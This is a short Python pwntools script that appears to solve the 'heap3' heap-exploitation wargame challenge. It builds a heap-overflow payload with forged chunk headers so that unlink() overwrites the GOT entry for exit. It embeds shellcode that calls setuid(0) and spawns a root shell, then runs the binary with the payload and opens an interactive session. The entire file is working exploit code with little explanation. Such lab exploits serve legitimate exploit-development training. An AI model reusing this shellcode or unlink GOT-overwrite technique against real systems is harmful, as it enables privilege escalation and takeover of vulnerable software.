#!/usr/bin/env python

from pwn import *
from pwntrace import *

context(os='linux', arch='i386')

heap3 = ELF("./heap3")

ltrace = heap_ltrace("./heap3")
payload_offset = ltrace.trace_now()[0]['ret']

# Shellcode that sets the UID to 0 and spawns a root shell. (55 bytes)
shellcode = ("\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43"
"\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff"
"\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42")

payload  = "\xeb\x0e" + "A"*14
payload += shellcode
payload += "A"*213
payload += p32(-1, sign=True)
payload += "A"*8
payload += p32(-4, sign=True)
payload += p32(-16, sign=True)
payload += "A"*4
payload += p32(heap3.got["exit"] - 12)  # Due to the behavior of unlink() we need to subtract 12 bytes from this
                                        # address to ensure the appropriate place inside the GOT is overwritten
payload += p32(payload_offset)

log.info("Payload :\n{0}".format(hexdump(payload)))

p = process(["./heap3", payload])
p.interactive()

